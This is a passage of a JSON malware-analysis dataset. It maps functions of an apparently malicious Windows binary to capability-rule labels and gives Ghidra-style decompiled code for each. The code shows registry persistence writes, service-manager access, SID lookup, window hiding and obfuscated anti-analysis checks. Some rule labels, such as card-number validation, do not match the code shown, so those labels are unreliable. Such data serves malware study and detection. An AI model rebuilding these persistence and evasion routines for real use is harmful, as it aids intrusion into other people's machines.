extraout_ECX;\n    if (bVar8) {\n        return false;\n    }\n    puVar6 = &stack0xfffffffc;\n    if ((!bVar8) && (puVar6 = &stack0xfffffffc,  bVar8)) {\n        puVar5 = &stack0xfffffff0;\n        puVar6 = &stack0xfffffff0;\n        puStack16 = &stack0xfffffffc;\n        cVar1 = '\\x10';\n        do {\n            puVar4 = puVar4 + -1;\n            puVar5 = puVar5 + -1;\n            *puVar5 = *puVar4;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = *(puVar6 + -4);\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4106a4, 0x4106e4, 1, *(puVar6 + -4), ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 645
    },
    "00402c40": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00402da0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e05) overlaps instruction at (ram,0x00402e04)\n// \n\nuint __cdecl fcn.00402da0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    ulong uVar3;\n    uint var_31ch;\n    uint lpBuffer;\n    uint Sid;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    pcbBuffer = 0x104;\n    uVar3 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&lpBuffer, &pcbBuffer);\n    bVar2 = (POPCOUNT(uVar3 & 0xff) & 1U) == 0;\n    if (uVar3 == 0) {\n        return 0;\n    }\n    var_4h = 0x104;\n    var_8h = 0x104;\n    if ((bVar2) || (!bVar2)) {\n        uVar3 = CONCAT44(&var_10h, &var_8h);\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)(0, &lpBuffer, &Sid, &var_4h, &var_31ch, uVar3);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(&Sid, arg_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 359
    },
    "00403cb0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403cb0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    if (arg_ch == 1) {\n        fcn.00402e90();\n        fcn.00404000();\n        if (*0x41fa14 == 0) {\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n            fcn.00401750();\n        }\n    }\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 137
    },
    "00402030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402030(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint8_t in_DL;\n    bool bVar1;\n    bool bVar2;\n    uint uVar3;\n    \n    bVar1 = false;\n    bVar2 = (in_DL & 0x66) == 0;\n    uVar3 = 0;\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((!bVar1 && !bVar2) && (bVar1 || bVar2)) {\n        hSCManager = uVar3;\n    }\n    uVar3 = fcn.00403f60(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar3;\n}\n",
        "token_count": 192
    },
    "00402390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00402390(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004023c0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 68
    },
    "00402a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402a65) overlaps instruction at (ram,0x00402a60)\n// \n\nuint fcn.00402a20(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    uint16_t unaff_BX;\n    bool bVar2;\n    \n    uVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    bVar2 = (POPCOUNT((uVar1 ^ unaff_BX) & 0xff) & 1U) == 0;\n    fcn.00401380(uVar1, param_1);\n    if ((bVar2) || (uVar1 = param_1,  !bVar2)) {\n        uVar1 = param_2;\n    }\n    uVar1 = fcn.00401000(0x34a96cf4, param_1, uVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(0x34a96cf4);\n    return uVar1;\n}\n",
        "token_count": 242
    },
    "00402d30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d74) overlaps instruction at (ram,0x00402d72)\n// \n\nuint32_t __fastcall fcn.00402d30(uint8_t *param_1, char *param_2)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    char extraout_DL;\n    int32_t unaff_EBP;\n    uint *unaff_ESI;\n    uchar *unaff_EDI;\n    bool in_CF;\n    bool bVar8;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool in_OF;\n    ushort uVar9;\n    \n    if ((in_OF) || (!in_OF)) {\n        if (*0x41fa10 != 0) {\n            return *0x41fa10;\n        }\n        if ((POPCOUNT(*0x41fa10 & 0xff) & 1U) != 0) goto code_r0x00402d49;\n    }\n    else {\n        uVar2 = in(param_2);\n        *unaff_EDI = uVar2;\n        unaff_EDI = unaff_EDI + 1;\n        if (!in_CF && !in_ZF) {\n            uVar6 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(unaff_EBP + -0x218);\n            bVar8 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n            if (uVar6 == 0) {\n                return 0;\n            }\n            *(unaff_EBP + -4) = 0x104;\n            *(unaff_EBP + -8) = 0x104;\n            if ((bVar8) || (cVar5 = extraout_DL,  !bVar8)) {\n                cVar5 = unaff_EBP + -0x10;\n                uVar6 = unaff_EBP - 8;\n            }\n            *(unaff_EBP + 0x458df055) = *(unaff_EBP + 0x458df055) | 0xfffffff8;\n            iVar7 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)\n                              (0, unaff_EBP + -0x218, unaff_EBP + -0x114, unaff_EBP + -4, unaff_EBP + -0x31c, uVar6, \n                               cVar5);\n            if (iVar7 != 0) {\n                iVar7 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)(unaff_EBP + -0x114, *(unaff_EBP + 8));\n                if (iVar7 != 0) {\n                    return 1;\n                }\n                return 0;\n            }\n            return 0;\n        }\ncode_r0x00402d49:\n        uVar9 = 0x56;\n        uVar3 = *param_1;\n        puVar1 = unaff_EBP + 0x7a3375c0;\n        uVar4 = *puVar1;\n        *puVar1 = *puVar1 + 0xa1;\n        uVar6 = (0x5e < uVar4) + 0xa0606707;\n        if ((POPCOUNT(uVar6 & 0xff) & 1U) == 0) {\n            out(*unaff_ESI, param_2);\n            do {\n                cVar5 = uVar6 >> 8;\n                in_AF = 9 < (uVar6 & 0xf) | in_AF;\n                uVar6 = CONCAT31(CONCAT21(uVar6 >> 0x10, cVar5 - in_AF), -in_AF);\n            } while (in_AF || cVar5 == *param_2);\n            *(unaff_EDI + param_2 * 2) = (*(unaff_EDI + param_2 * 2) + 0x7b) - in_AF;\n            *(param_1 + 0x6a) = uVar6;\n            cVar5 = -in_AF + -0x54 + CARRY1(uVar3, uVar3);\n            goto code_r0x00402d7c;\n        }\n    }\n    uVar9 = 0;\n    cVar5 = (*_sym.imp.MSVCRT.dll_time)(0);\ncode_r0x00402d7c:\n    uVar6 = (*_sym.imp.MSVCRT.dll_srand)(cVar5, uVar9);\n    *0x41fa10 = 1;\n    return uVar6;\n}\n",
        "token_count": 1038
    },
    "00403c90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00403c90(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403d20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e32) overlaps instruction at (ram,0x00403e2d)\n// \n\nvoid __fastcall fcn.00403d20(uint param_1, int32_t param_2)\n\n{\n    char *pcVar1;\n    uchar uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    uint32_t uVar7;\n    uint8_t uVar8;\n    uint unaff_EBP;\n    uint *puVar9;\n    int32_t iVar10;\n    uint *unaff_EDI;\n    uint *puVar11;\n    bool bVar12;\n    bool bVar13;\n    bool bVar14;\n    int32_t in_stack_00000010;\n    \n    bVar12 = false;\n    bVar14 = false;\n    bVar13 = in_stack_00000010 == 0;\n    if (in_stack_00000010 < 1) {\n        return;\n    }\n    iVar10 = 1;\n    puVar9 = &stack0xfffffffc;\n    puVar11 = unaff_EDI;\n    while( true ) {\n        if ((bVar14) || (!bVar14)) {\n            param_2 = puVar9[4];\n            iVar4 = puVar9[-2];\n        }\n        else {\n            uVar2 = in(param_2);\n            *puVar11 = uVar2;\n            if (!bVar12 && !bVar13) {\n                return;\n            }\n            iVar4 = -0x74efaa75;\n            puVar9 = puVar9 + 1;\n        }\n        uVar5 = *(iVar4 + param_2);\n        puVar11 = puVar9[3];\n        uVar3 = puVar9[2];\n        uVar8 = *(iVar10 % puVar11 + uVar3);\n        *(puVar9 + -2) = uVar8;\n        uVar6 = (iVar10 % puVar11 & 0xff00 | (uVar8 & 0x4e | 0x38) & iVar10 / puVar11) & iVar10 / puVar11 ^ 0x3c00;\n        uVar7 = (uVar6 & 0xff | (uVar6 >> 8) + (uVar3 >> 8) << 8) | 0x604;\n        bVar12 = SCARRY1(uVar7 >> 8, uVar7);\n        if ((!bVar12) && (bVar12)) {\n            *unaff_EDI = unaff_EBP;\n            return;\n        }\n        uVar7 = (iVar10 + -1) % puVar11;\n        *(puVar9 + -1) = uVar5 ^ *(uVar7 + uVar3);\n        bVar12 = (uVar7 & 0x1200) != 0;\n        if ((bVar12) && (!bVar12)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        uVar5 = *(puVar9 + -4);\n        iVar10 = puVar9[6];\n        uVar8 = uVar5 ^ *(puVar9 + -1);\n        bVar12 = (POPCOUNT(uVar8) & 1U) == 0;\n        param_2 = puVar9[-3];\n        *(iVar10 + -1 + param_2) = uVar8;\n        if ((bVar12) || (!bVar12)) {\n            uVar8 = *(puVar9 + -2);\n            param_2 = param_2 + 2;\n            uVar5 = uVar5 ^ uVar8;\n        }\n        uVar7 = uVar7 & 0xffffff00 | uVar5;\n        pcVar1 = (uVar3 & 0xffffff00 | uVar8) + 0xd33202c0;\n        *pcVar1 = *pcVar1 + '\\x01';\n        unaff_EDI[-3] = uVar7 + 1;\n        *((uVar7 - 1) + iVar10) = param_2;\n        uVar3 = unaff_EDI[5];\n        uVar7 = unaff_EDI[-2] + 1;\n        bVar12 = uVar7 < uVar3;\n        bVar14 = SBORROW4(uVar7, uVar3);\n        bVar13 = uVar7 == uVar3;\n        unaff_EDI[-2] = uVar7;\n        if (uVar3 <= uVar7) break;\n        iVar10 = unaff_EDI[-3];\n        puVar9 = unaff_EDI;\n    }\n    return;\n}\n",
        "token_count": 1040
    },
    "00403e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403ea0) overlaps instruction at (ram,0x00403e9f)\n// \n\nuint fcn.00403e60(uint *param_1, uint *param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint8_t uStack0000005a;\n    uint in_stack_00000058;\n    \n    puVar2 = param_2;\n    puVar1 = param_1;\n    iVar3 = fcn.00402200(param_1, param_2, &param_1, &param_2);\n    if (iVar3 != 0) {\n        *(iVar3 + 0x58) = param_2;\n        *puVar1 = *puVar2;\n        uStack0000005a = uStack0000005a | 0x8d;\n        fcn.00402200(puVar1 + 1, puVar2 + 1, &param_1, &param_2);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 243
    },
    "00404000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040404d) overlaps instruction at (ram,0x0040404b)\n// \n// WARNING: Possible PIC construction at 0x0040402b: Changing call to branch\n// WARNING: Possible PIC construction at 0x00404092: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00404030)\n// WARNING: Removing unreachable block (ram,0x0040413f)\n\nuint32_t fcn.00404000(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint in_EAX;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    bool bVar8;\n    bool bVar9;\n    uint uStack476;\n    uint uStack472;\n    uint uStack468;\n    uint uStack464;\n    uint uStack460;\n    uint uStack456;\n    uint uStack452;\n    uint uStack448;\n    uchar *puStack444;\n    uchar *puStack440;\n    uchar auStack428 [4];\n    uchar uStack420;\n    uint uStack419;\n    uint uStack415;\n    uint uStack411;\n    ushort uStack407;\n    uchar uStack405;\n    uchar uStack404;\n    uint uStack403;\n    uint uStack164;\n    uint arg_8h;\n    uchar uStack132;\n    uint uStack131;\n    uchar uStack100;\n    uint uStack99;\n    uchar uStack68;\n    uint uStack67;\n    uchar uStack36;\n    uint uStack35;\n    uint uStack8;\n    \n    puVar7 = &stack0xfffffffc;\n    if ((SBORROW4(&stack0xfffffffc, 0x80)) || (!SBORROW4(&stack0xfffffffc, 0x80))) {\n        in_EAX = fcn.00404580();\n    }\n    iVar5 = CONCAT31(in_EAX >> 8, 0x98);\n    bVar9 = SCARRY4(iVar5, -0x3f7b0000);\n    uVar4 = iVar5 + 0xc0850000;\n    bVar8 = (POPCOUNT(uVar4 & 0xff) & 1U) == 0;\n    if (uVar4 != 0) {\n        if ((bVar9 == uVar4 < 0) && (bVar9 != uVar4 < 0)) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        arg_8h = 0x404052;\n        func_0x00402550();\n        if ((!bVar8) && (bVar8)) {\n            puVar6 = &stack0xffffff6c;\n            cVar1 = '\\x1e';\n            do {\n                puVar7 = puVar7 + -1;\n                puVar6 = puVar6 + -1;\n                *puVar6 = *puVar7;\n                cVar1 = cVar1 + -1;\n            } while ('\\0' < cVar1);\n            uVar4 = in(0x78);\n            return uVar4;\n        }\n        iVar5 = fcn.004015e0(0x410514);\n        if (iVar5 == -1) {\n            fcn.004035a0();\n            iVar5 = fcn.00402000();\n            if (iVar5 != 0) {\n                return 0;\n            }\n            uStack36 = 0;\n            uStack132 = 0;\n            puVar7 = &stack0xffffffdd;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack100 = 0;\n            puVar7 = &stack0xffffff7d;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack68 = 0;\n            puVar7 = &stack0xffffff9d;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            puVar7 = &stack0xffffffbd;\n            for (iVar5 = 7; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            *puVar7 = 0;\n            *(puVar7 + 2) = 0;\n            uStack164 = 0x404128;\n            iVar5 = fcn.00401470(&stack0xffffff7c, &stack0xffffff9c, &stack0xffffffdc, &stack0xffffffbc);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            iVar5 = fcn.00401950(arg_8h);\n            if (iVar5 == 0) {\n                return 0;\n            }\n            iVar5 = fcn.004039b0();\n            return iVar5 != 0;\n        }\n        iVar5 = fcn.004015e0(0x410508);\n        if (iVar5 != -1) {\n            return 0;\n        }\n    }\n    uStack419 = 0;\n    uStack415 = 0;\n    uStack411 = 0;\n    uStack420 = 0;\n    uStack407 = 0;\n    uStack404 = 0;\n    uStack405 = 0;\n    puVar7 = &stack0xfffffe6d;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    fcn.00402d30();\n    puStack440 = 0x4041fa;\n    fcn.004016c0(&stack0xfffffe5c, 5);\n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    puStack440 = &stack0xfffffe6c;\n    puStack444 = 0x404214;\n    (*_sym.imp.MSVCRT.dll_sprintf)();\n    puStack440 = 0x404227;\n    (*_sym.imp.SHLWAPI.dll_SHDeleteKeyA)();\n    pcVar3 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    puStack444 = &stack0xfffffe54;\n    puStack440 = 0x10;\n    uStack448 = 1;\n    uStack452 = 0x41fa0c;\n    uStack456 = 0x410808;\n    uStack460 = 0x80000000;\n    uStack464 = 0x404247;\n    (*_sym.imp.SHLWAPI.dll_SHSetValueA)();\n    uStack464 = 0x4b;\n    uStack468 = 0x41083c;\n    uStack472 = 1;\n    uStack476 = 0x41fa0c;\n    (*pcVar3)(0x80000000, &stack0xfffffe4c);\n    (*pcVar2)(&stack0xfffffe34, 0x410888, &stack0xfffffe24);\n    uVar4 = (*pcVar3)(0x80000000, &stack0xfffffe34, 0x4108c4, 1, 0x4108cc, 0x14);\n    return uVar4;\n}\n",
        "token_count": 1802
    },
    "004042a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404352) overlaps instruction at (ram,0x00404351)\n// \n// WARNING: Removing unreachable block (ram,0x00404378)\n\nvoid __cdecl fcn.004042a0(code **arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uchar *puVar2;\n    uint8_t uVar3;\n    uint16_t uVar5;\n    code *in_EAX;\n    code *pcVar6;\n    code *pcVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t *in_ECX;\n    uint32_t uVar10;\n    uint16_t uVar11;\n    int32_t *in_EDX;\n    int16_t unaff_BX;\n    uint *puVar12;\n    uint *puVar13;\n    uchar *puVar14;\n    code *unaff_ESI;\n    uchar *puVar15;\n    code **unaff_EDI;\n    char *pcVar16;\n    code **ppcVar17;\n    uint16_t in_ES;\n    ushort in_SS;\n    uchar in_CF;\n    bool bVar18;\n    uchar in_PF;\n    uint8_t in_AF;\n    uchar in_ZF;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    uint32_t uStack24179;\n    uint uStack24;\n    ushort uVar19;\n    char cVar4;\n    \n    puVar12 = &stack0xfffffffc;\n    pcVar6 = in_EAX;\n    pcVar7 = unaff_ESI;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        in_CF = 0;\n        in_OF = '\\0';\n        in_SF = &stack0xfffffff0 < 0;\n        in_ZF = *0x10 == 0x10;\n        in_PF = (POPCOUNT(&stack0xfffffff0 & 0xff) & 1U) == 0;\n        pcVar6 = unaff_ESI;\n        pcVar7 = in_EAX;\n        arg_8h = unaff_EDI;\n        if (in_SF) goto code_r0x004042be;\n        unaff_ESI[0x66] = unaff_ESI[0x66] + in_EDX;\n        pcVar6 = 0xf58ea42;\n        *0xf58ea42 = *0xf58ea42 + 'B';\n        ppcVar17 = unaff_EDI + 0x16;\n        in_CF = 0x15 < *ppcVar17;\n        in_OF = SCARRY1(*ppcVar17, -0x16);\n        *ppcVar17 = *ppcVar17 + -0x16;\n        in_SF = *ppcVar17 < '\\0';\n        in_ZF = *ppcVar17 == '\\0';\n        in_PF = (POPCOUNT(*ppcVar17) & 1U) == 0;\ncode_r0x004042d5:\n        in_EDX = 0xb7bc9ea5;\n        if (!in_CF) {\n            if (in_PF) {\n                *in_ECX = *in_ECX | pcVar6;\n                (*arg_8h)();\n                goto code_r0x00404279;\n            }\n            in_OF = '\\0';\n            in_SF = &stack0xfffffff4 < 0;\n            in_ZF = *0x10 == 0xc;\n            in_PF = (POPCOUNT(&stack0xfffffff4 & 0xff) & 1U) == 0;\n            pcVar6 = pcVar6;\n            goto code_r0x004042e5;\n        }\ncode_r0x00404305:\n        pcVar7 = pcVar6;\n        if (in_OF == in_SF) goto code_r0x00404314;\ncode_r0x00404311:\n        pcVar6 = in_EAX;\n        arg_8h = arg_8h + 1;\n        puVar1 = in_ECX + -0x3678ec84;\n        bVar18 = CARRY4(in_ECX, *puVar1);\n        in_OF = SCARRY4(in_ECX, *puVar1);\n        in_ECX = in_ECX + *puVar1;\n        in_SF = in_ECX < 0;\n        in_ZF = in_ECX == NULL;\n        in_PF = (POPCOUNT(in_ECX & 0xff) & 1U) == 0;\n        in_EAX = pcVar7;\n        if (in_OF == in_SF) goto code_r0x0040432d;\n        *(pcVar6 + -0x7ce92414) = in_ST0;\n        uVar3 = pcVar6 + -1;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        uVar3 = uVar3 + in_AF * '\\x06';\n        cVar4 = uVar3 + (0x90 < (uVar3 & 0xf0) | bVar18 | in_AF * (0xf9 < uVar3)) * '`';\n        *in_EDX = *in_EDX + 0x47c6df84;\n        in_OF = SCARRY1(cVar4, 'p');\n        uVar3 = cVar4 + 0x70;\n        pcVar6 = pcVar6 + -1 & 0xffffff00 | uVar3;\n        in_SF = uVar3 < '\\0';\n        in_ZF = uVar3 == 0;\n        in_PF = (POPCOUNT(uVar3) & 1U) == 0;\n    }\n    else {\ncode_r0x004042be:\n        *arg_8h = 0x4e;\n        in_EAX = pcVar7;\n        if ((!in_PF) && (in_PF)) {\n            ppcVar17 = segment(in_SS, *0x10 + -0x10);\n            pcVar6 = *ppcVar17;\n            goto code_r0x004042d5;\n        }\ncode_r0x004042e5:\n        *(arg_8h + 1) = 3;\n        if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n            if (in_ECX != NULL) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\ncode_r0x00404279:\n            (*in_EAX)();\n            return;\n        }\n        *(arg_8h + 2) = 0x79;\n        if (in_OF == in_SF) goto code_r0x00404305;\ncode_r0x00404314:\n        *(arg_8h + 3) = 0x89;\n        pcVar7 = pcVar6;\n        if (in_OF == in_SF) goto code_r0x00404311;\ncode_r0x0040432d:\n        *(arg_8h + 1) = 0x70;\n    }\n    uVar11 = in_EDX;\n    if (in_ZF) {\ncode_r0x00404342:\n        *(arg_8h + 5) = 0x21;\n        if (in_PF) goto code_r0x00404352;\n        uVar19 = in_ECX >> 0x10;\n    }\n    else {\n        uVar19 = SUB42(in_ECX, 0);\n        in_ECX = (in_ECX >> 8 & 0xffff00) << 8 | in_ECX & 0xffff;\n        if (!in_ZF) goto code_r0x00404342;\n    }\n    arg_8h = CONCAT22(uVar19, in_SS);\n    in_OF = SCARRY4(pcVar6, 0x510a7a21);\n    pcVar6 = pcVar6 + 0x510a7a21;\n    in_SF = pcVar6 < 0;\n    in_ECX = 0x47;\n    if ((POPCOUNT(pcVar6 & 0xff) & 1U) == 0) {\n        return;\n    }\ncode_r0x00404352:\n    *(arg_8h + 6) = 0xcf;\n    ppcVar17 = arg_8h;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, pcVar6);\n        uVar11 = uVar11 & 0xff00 | in_EDX ^ in_ECX;\n        ppcVar17 = arg_8h + 1;\n        *arg_8h = pcVar6;\n    }\n    *(ppcVar17 + 7) = 0xb6;\n    puVar13 = &stack0xffffffec;\n    bVar18 = in_ECX >> 8 != unaff_BX;\n    uVar10 = in_ECX & 0xffff;\n    uVar8 = CONCAT31(pcVar6 >> 8, 0xa3);\n    *(ppcVar17 + 2) = 0xa3;\n    puVar14 = &stack0xfffffffc;\n    if ((bVar18) && (puVar14 = &stack0xfffffffc,  !bVar18)) {\n        cVar4 = '\\x10';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar13 = puVar13 + -1;\n            *puVar13 = *puVar12;\n            cVar4 = cVar4 + -1;\n            puVar14 = &stack0xffffffec;\n        } while ('\\0' < cVar4);\n    }\n    *(ppcVar17 + 9) = 0xa3;\n    uVar5 = uVar8 + unaff_BX | 0x11a9;\n    *(ppcVar17 + 10) = 0x3c;\n    if ((uVar5 != 0) && (uVar5 == 0)) {\n        uVar8 = uVar8 & 0xffffff00 | *0x4bb148d3;\n        out(*in_EAX, uVar11);\n    }\n    *(ppcVar17 + 0xb) = 0xd8;\n    if ((-1 < uVar5) && (-1 >= uVar5)) {\n        uStack24179 = in_ES;\n        pcVar16 = ppcVar17 | puVar14;\n        ppcVar17 = pcVar16 + 1;\n        *pcVar16 = uVar8;\n        uVar8 = uVar8 + (uVar8 >> 8) * 'y';\n    }\n    *(ppcVar17 + 3) = 0x3d;\n    while( true ) {\n        puVar2 = *(puVar14 + 8);\n        puVar2[0xd] = 0x14;\n        bVar18 = (uVar10 - 5U & 0x44) != 0;\n        puVar2[0xe] = 0x6b;\n        uVar9 = uVar8;\n        puVar15 = puVar2;\n        if ((bVar18) && (!bVar18)) {\n            uVar9 = uVar8 & 0xffffff00 | *0x4bb148d3;\n            puVar15 = puVar2 + 1;\n            out(*puVar2, uStack24179);\n        }\n        puVar15[0xf] = 3;\n        bVar18 = (uStack24179 & 0x1200) == 0;\n        uVar10 = *(puVar14 + 8);\n        *(uVar10 + 0x10) = 0xd4;\n        if ((bVar18) || (!bVar18)) break;\n        in_AF = 9 < (uVar9 & 0xf) | in_AF;\n        uVar8 = CONCAT11((uVar9 >> 8) + in_AF, uVar9 + in_AF * '\\x06') & 0xff0f;\n        uStack24179 = uVar9;\n        if (uVar10 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(uVar10 + 0x11) = 0x44;\n    *(uVar10 + 0x12) = 0x3d;\n    *(uVar10 + 0x13) = 0xa0;\n    *(uVar10 + 0x14) = 0;\n    **(puVar14 + 0xc) = 0x15;\n    return;\n}\n",
        "token_count": 2764
    },
    "004044f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040450e)\n// WARNING: Removing unreachable block (ram,0x00404517)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.004044f0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    bool bVar3;\n    uint uStack24255;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    bVar3 = false;\n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_68h;\n    fcn.004042a0(puVar2, &var_4h);\n    if ((!bVar3) && (bVar3)) {\n        *puVar2 = uStack24255;\n        return;\n    }\n    fcn.00402c40(&var_68h, var_4h, 0x4109d4, 0xf000);\n    *arg_8h = 0x4109d4;\n    *arg_ch = 0xf000;\n    return;\n}\n",
        "token_count": 348
    },
    "00402350": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402350(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "00402b40": {
        "rules": [
            "hide graphical window"
        ],
